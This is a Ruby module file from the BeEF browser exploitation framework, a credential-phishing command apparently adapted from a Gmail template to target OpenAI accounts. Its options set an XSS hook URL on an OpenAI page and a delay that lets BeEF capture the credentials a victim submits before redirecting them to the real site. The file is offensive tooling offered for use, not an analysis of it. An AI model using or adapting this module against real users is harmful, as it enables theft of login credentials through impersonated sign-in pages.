#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Gmail_phishing < BeEF::Core::Command
  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.beef_proto

    xss_hook_url = "https://chat.openai.com/auth/error?error=RequestTimeout"
    wait_seconds_before_redirect = 100
    [
      { 'name' => 'xss_hook_url',
        'description' => 'The URI including the XSS to hook a browser. If the XSS is not exploitable via an URI, ' \
        'simply leave this field empty, but this means you will loose the hooked browser after executing this module.',
        'ui_label' => 'XSS hook URI',
        'value' => xss_hook_url,
        'width' => '300px' 
      }, 
      {
          'name' => 'wait_seconds_before_redirect',
          'description' => 'When the user submits his credentials on the phishing page, we have to wait (in ms) ' \
          'before we redirect to the real openai page, so that BeEF gets the credentials in time.',
          'ui_label' => 'Redirect delay (ms)',
          'value' => wait_seconds_before_redirect,
          'width' => '100px'
        }
    ]
  end

  def post_execute
    content = {}
    content['Result'] = @datastore['result']
    save content
  end
end
